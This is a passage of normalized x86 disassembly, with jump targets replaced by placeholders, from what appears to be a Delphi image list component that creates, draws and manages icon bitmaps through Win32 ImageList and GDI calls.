mov eax edi
pop edi
pop esi
pop ebx
retn
sub_445798
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_4457dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_445801
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445808
retn
sub_4459cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41914c
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_445a18
push ebx
push esi
push edi
call sub_4035cc
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413894
mov edx eax
mov eax edi
call sub_446608
mov eax [ edi + 0x50 ]
call sub_403258
mov eax edi
call sub_445cdc
mov eax [ edi + 0x4c ]
call sub_403258
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419198
test bl bl
jle r-xdata
call sub_403258
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035b4
sub_445a84
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_445b31
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_446590
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_445b50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445b38
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_445b50
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_445bf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_420cf8
mov eax ebx
call sub_4200f8
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41c9b0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412378
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4200f8
pop edx
call sub_41d014
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445bf8
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_445c14
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_445b50
pop ecx
pop edx
pop ebx
retn
sub_445c4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_445cdc
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_445c14
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403454
sub_445c88
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_446518
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_420164
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445cdc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403454
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_445c78
push eax
call ImageList_Destroy
sub_445d14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_445da7
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_445b3c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445dae
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov edx eax
mov eax ebx
call sub_445f3c
sub_445db4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445e63
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_445e46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_445b44
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445c88
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445c88
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445e4d
mov eax [ ebp - 0x10 ]
call sub_403258
retn
sub_445e80
push ebx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_445c78
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_445ea4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_445f23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_445e80
cmp esi eax
jl r-xdata
mov eax ebx
call sub_445b3c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
mov eax ebx
mov si 0xffef
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445f2a
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
push esi
mov eax ebx
call sub_445c78
push eax
call ImageList_Remove
sub_445f3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44598c
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403454
pop esi
pop ebx
retn
sub_445f74
push ebx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_445c78
push eax
call ImageList_GetBkColor
call sub_4459ac
pop ebx
retn
sub_445f9c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44598c
push eax
mov eax ebx
call sub_445f74
call sub_44598c
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41d438
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_445c78
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4200f8
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41c9b0
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412378
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4200f8
pop edx
call sub_41d014
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4200f8
call sub_41d438
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_445c78
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412378
mov eax [ ebx + 0x54 ]
call sub_4200f8
call sub_41d438
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41c9b0
mov eax edi
call sub_41d438
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41c9b0
mov eax edi
call sub_41d438
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_420f48
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_446170
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_446194
pop ebx
pop ebp
retn 0xc
sub_446194
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4461e0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412378
mov eax [ ebp - 0x4 ]
call sub_446e74
xor eax eax
push ebp
push sub_446379
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44635c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44633f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_420f48
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446346
mov eax [ ebp - 0x10 ]
call sub_403258
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4200f8
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d014
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41d438
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4200f8
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d014
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41d438
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_445db4
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_446388
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_445c78
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_4461e0
sub_4463a8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
call sub_445cdc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413d50
mov eax ebx
call sub_445f30
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_446590
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_445c78
mov edx eax
mov eax ebx
call sub_445c14
mov eax ebx
call sub_445b3c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_445c78
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_445b44
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_445c78
push eax
call ImageList_GetBkColor
call sub_4459ac
mov edx eax
mov eax ebx
call sub_445f3c
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_446388
jmp r-xdata
sub_446468
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413e34
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_446590
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_445f30
mov eax esi
call sub_445c78
mov edx eax
mov eax ebx
call sub_445c14
mov eax ebx
call sub_445b3c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_445c78
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_445b44
jmp r-xdata
mov eax esi
call sub_445c78
push eax
call ImageList_GetBkColor
call sub_4459ac
mov edx eax
mov eax ebx
call sub_445f3c
mov edx esi
mov eax ebx
call sub_446388
pop esi
pop ebx
retn
sub_446518
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446584
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44658b
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_4465b8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4137ac
mov si 0xffff
call sub_403454
inc ebp
dec edi
jne r-xdata
sub_446608
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41369c
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4137ac
cmp ebp eax
jne r-xdata
sub_446660
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407b14
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4466a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_445e80
mov ebx eax
mov eax edi
call sub_445e80
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_445e80
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_446780
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_446763
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_446660
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44676a
mov eax [ ebp - 0xc ]
call sub_403258
retn
mov eax edi
call sub_445e80
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_446794
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_445e80
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4466a4
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4467f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4194c4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_446794
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446848
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_415618
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_415618
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_446acc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4153ec
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41540c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_446aaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_420f48
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412378
mov eax [ ebp - 0x4 ]
call sub_446e74
xor eax eax
push ebp
push sub_446a92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446a99
mov eax [ ebp - 0xc ]
call sub_403258
mov eax [ ebp - 0x14 ]
call sub_403258
mov eax [ ebp - 0x4 ]
call sub_446e78
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4123a0
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4200f8
push eax
mov eax [ ebp - 0xc ]
call sub_4200f8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41cee0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4123a0
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4200f8
push eax
mov eax [ ebp - 0x14 ]
call sub_4200f8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41cee0
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_445db4
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_446adc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419c58
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_446b3c
push [ fs : eax ]
mov [ fs : eax ] esp
